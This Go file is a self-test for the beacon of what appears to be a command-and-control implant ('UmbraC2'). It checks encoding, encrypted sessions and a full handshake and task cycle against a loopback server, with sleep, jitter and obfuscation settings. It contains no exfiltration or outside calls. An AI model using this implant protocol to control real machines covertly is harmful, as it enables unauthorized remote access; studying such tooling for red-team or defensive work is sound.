package beacon

import (
	"context"
	"errors"
	"fmt"
	"net"
	"reflect"
	"time"

	"github.com/thesyntax1/UmbraC2/implant/go/internal/crypt"
	"github.com/thesyntax1/UmbraC2/implant/go/internal/session"
	"github.com/thesyntax1/UmbraC2/implant/go/internal/upk"
	"github.com/thesyntax1/UmbraC2/implant/go/internal/wire"
)

// SelfTest runs the offline checks of the implant.
//
// Nothing here touches the network: the checks prove that the encoding,
// the session and the whole handshake work, so an implant that is built
// from this tree can be trusted before it ever meets a server.
//
// The third check is the interesting one: a server that lives in this
// process answers the handshake and runs one cycle, so the implant is
// proved to be understood by a server and not only by itself.
func SelfTest() error {
	value := map[string]any{
		"s":   "şifreli",
		"n":   uint64(300),
		"neg": int64(-1),
		"b":   []byte{0, 1, 0xfe},
	}
	encoded, err := upk.Encode(value)
	if err != nil {
		return fmt.Errorf("encode: %w", err)
	}
	decoded, err := upk.DecodeExact(encoded)
	if err != nil {
		return fmt.Errorf("decode: %w", err)
	}
	if !reflect.DeepEqual(decoded, value) {
		return errors.New("the encoding round trip changed the value")
	}

	psk := []byte("umbra-selftest-key-material")
	suite := wire.SuiteAES256GCM
	client, err := session.NewBootstrap(psk, suite, false)
	if err != nil {
		return fmt.Errorf("bootstrap session: %w", err)
	}
	server, err := session.NewBootstrap(psk, suite, true)
	if err != nil {
		return fmt.Errorf("bootstrap session: %w", err)
	}
	frame, err := client.Encrypt(wire.MsgCheckin, value)
	if err != nil {
		return fmt.Errorf("seal: %w", err)
	}
	msgType, plain, err := server.OpenFrame(frame)
	if err != nil {
		return fmt.Errorf("open: %w", err)
	}
	if msgType != wire.MsgCheckin {
		return fmt.Errorf("the frame came back as %s", wire.TypeName(msgType))
	}
	back, err := upk.DecodeExact(plain)
	if err != nil {
		return fmt.Errorf("decode body: %w", err)
	}
	if !reflect.DeepEqual(back, value) {
		return errors.New("the session round trip changed the value")
	}
	if _, _, err := server.OpenFrame(frame); err == nil {
		return errors.New("the replay was accepted")
	}

	view, err := selfTestCycle(psk, suite)
	if err != nil {
		return fmt.Errorf("the cycle against the built-in server failed: %w", err)
	}
	if view.result == nil {
		return errors.New("the built-in server did not receive a result")
	}
	if code := i64Or(view.result, "code", -1); code != 0 {
		return fmt.Errorf("the task of the built-in server failed with the code %d", code)
	}
	if view.heartbeat == nil {
		return errors.New("the built-in server did not receive a heartbeat")
	}
	return nil
}

// serverView is what the built-in server saw of one cycle.
type serverView struct {
	// hello is the greeting of the implant.
	hello map[string]any
	// result is the outcome of the task of the batch.
	result map[string]any
	// heartbeat is the heartbeat of the implant.
	heartbeat map[string]any
}

// selfTestCycle runs one whole cycle of the protocol against the server
// that lives in this process.
func selfTestCycle(psk []byte, suite byte) (serverView, error) {
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return serverView{}, err
	}
	defer listener.Close()

	type outcome struct {
		view serverView
		err  error
	}
	done := make(chan outcome, 1)
	go func() {
		view, err := serveOnce(listener, psk, suite)
		done <- outcome{view: view, err: err}
	}()

	beacon, err := New(Config{
		Server:  listener.Addr().String(),
		PSK:     psk,
		ID:      "selftest",
		Sleep:   time.Second,
		Timeout: 15 * time.Second,
	})
	if err != nil {
		return serverView{}, err
	}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	if _, err := beacon.cycle(ctx); err != nil {
		return serverView{}, err
	}
	got := <-done
	if got.err != nil {
		return serverView{}, got.err
	}
	return got.view, nil
}

// serveOnce is the server half of the handshake and one cycle of the
// protocol.  It is the reference the implant is proved against.
func serveOnce(listener net.Listener, psk []byte, suite byte) (serverView, error) {
	conn, err := listener.Accept()
	if err != nil {
		return serverView{}, err
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(30 * time.Second))

	boot, err := session.NewBootstrap(psk, suite, true)
	if err != nil {
		return serverView{}, err
	}
	raw, err := wire.ReadFrame(conn)
	if err != nil {
		return serverView{}, fmt.Errorf("read hello: %w", err)
	}
	msgType, plain, err := boot.OpenFrame(raw)
	if err != nil {
		return serverView{}, fmt.Errorf("open hello: %w", err)
	}
	if msgType != wire.MsgHello {
		return serverView{}, fmt.Errorf("expected HELLO, got %s", wire.TypeName(msgType))
	}
	if len(plain) < 2 || plain[0] != wire.MarkerHello {
		return serverView{}, errors.New("bad HELLO marker")
	}
	decoded, err := upk.DecodeExact(plain[1:])
	if err != nil {
		return serverView{}, fmt.Errorf("decode hello: %w", err)
	}
	hello, ok := decoded.(map[string]any)
	if !ok {
		return serverView{}, errors.New("the hello body is not a map")
	}
	ident := strField(hello, "id")
	clientPub := binField(hello, "pub")
	cn := binField(hello, "cn")
	ts := u64Or(hello, "ts", 0)
	role := uint8(u64Or(hello, "role", 0))
	want, err := crypt.HelloAuth(psk, role, []byte(ident), clientPub, cn, ts, suite)
	if err != nil {
		return serverView{}, fmt.Errorf("hello auth: %w", err)
	}
	if !crypt.ConstantTimeEq(want, binField(hello, "auth")) {
		return serverView{}, errors.New("the hello of the implant did not authenticate")
	}

	serverKP, err := crypt.NewX25519Keypair()
	if err != nil {
		return serverView{}, err
	}
	sn, err := crypt.RandomBytes(16)
	if err != nil {
		return serverView{}, err
	}
	sid, err := crypt.RandomBytes(16)
	if err != nil {
		return serverView{}, err
	}
	shared, err := serverKP.Shared(clientPub)
	if err != nil {
		return serverView{}, err
	}
	prk, material, err := crypt.DeriveSession(shared, cn, sn)
	if err != nil {
		return serverView{}, err
	}
	ackAuth, err := crypt.AckAuth(psk, []byte(ident), clientPub, serverKP.Pub, cn, sn, sid, suite)
	if err != nil {
		return serverView{}, err
	}
	ack := map[string]any{
		"v":     uint64(wire.HelloVersion),
		"pub":   serverKP.Pub,
		"sn":    sn,
		"sid":   sid,
		"suite": uint64(suite),
		"auth":  ackAuth,
		"name":  "selftest-server",
		"cfg":   map[string]any{"sleep": uint64(5), "jitter": uint64(20), "obf": true},
		"meta":  map[string]any{"meta": "selftest"},
	}
	encoded, err := upk.Encode(ack)
	if err != nil {
		return serverView{}, err
	}
	ackFrame, err := boot.Encrypt(wire.MsgHelloAck, append([]byte{wire.MarkerHelloAck}, encoded...))
	if err != nil {
		return serverView{}, err
	}
	if _, err := conn.Write(ackFrame); err != nil {
		return serverView{}, fmt.Errorf("write hello ack: %w", err)
	}

	sess, err := session.New(suite, material, true, false, prk)
	if err != nil {
		return serverView{}, err
	}
	raw, err = wire.ReadFrame(conn)
	if err != nil {
		return serverView{}, fmt.Errorf("read check-in: %w", err)
	}
	msgType, _, err = sess.OpenMessage(raw)
	if err != nil {
		return serverView{}, fmt.Errorf("open check-in: %w", err)
	}
	if msgType != wire.MsgCheckin {
		return serverView{}, fmt.Errorf("expected CHECKIN, got %s", wire.TypeName(msgType))
	}

	batch := map[string]any{
		"tasks":  []any{map[string]any{"id": "t-1", "kind": "ping", "args": map[string]any{}}},
		"sleep":  uint64(5),
		"jitter": uint64(20),
		"obf":    true,
	}
	batchFrame, err := sess.Encrypt(wire.MsgTaskBatch, batch)
	if err != nil {
		return serverView{}, err
	}
	if _, err := conn.Write(batchFrame); err != nil {
		return serverView{}, fmt.Errorf("write batch: %w", err)
	}

	view := serverView{hello: hello}
	for i := 0; i < 8; i++ {
		raw, err = wire.ReadFrame(conn)
		if err != nil {
			return view, fmt.Errorf("read frame: %w", err)
		}
		msgType, body, err := sess.OpenMessage(raw)
		if err != nil {
			return view, fmt.Errorf("open frame: %w", err)
		}
		switch msgType {
		case wire.MsgHeartbeat:
			view.heartbeat = body
		case wire.MsgResult:
			view.result = body
		case wire.MsgBye:
			return view, nil
		}
		if view.result != nil {
			return view, nil
		}
	}
	return view, errors.New("the implant sent no result")
}
